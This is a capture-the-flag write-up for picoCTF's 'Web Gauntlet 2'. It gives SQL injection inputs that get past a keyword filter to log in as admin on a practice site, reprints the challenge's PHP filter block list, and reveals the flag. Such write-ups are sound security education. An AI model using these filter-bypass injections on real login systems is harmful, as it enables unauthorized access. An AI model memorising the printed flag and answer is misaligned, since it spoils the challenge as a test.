
# PICOCTF - Web Gauntlet 2



### Description:
> This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:35178/ Filter: http://mercury.picoctf.net:35178/filter.php


### Solution:
The challenge provides us with a login page that requires `username` and `password`. After a few attempt of brute forcing, we can understand that the `username` must be admin.
However, the filter has excluded `admin` as an option for the `username`, so we need a way to bypass this.

We can use '||' to concatenate two parts of the `admin`, for example, `ad'||'min` to bypass this. The password is much easier, we only need to provide something that returns true without using the filter's words. My take is something like `1 ' IS NOT ' 2`.

Therefore, our input can be:
```
username: ad'||'min
password: 1' IS NOT '2
```

Using the above credentials, we will be greeted with the message `Congrats! You won! Check out filter.php`. Finally, we can go to http://mercury.picoctf.net:35178/filter.php to access our flag.

```php
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd}
?>
```

If you can not access the flag even after completing the challenge, try reloading or clearing the cookie to get it.
## Flag

```
picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd}
```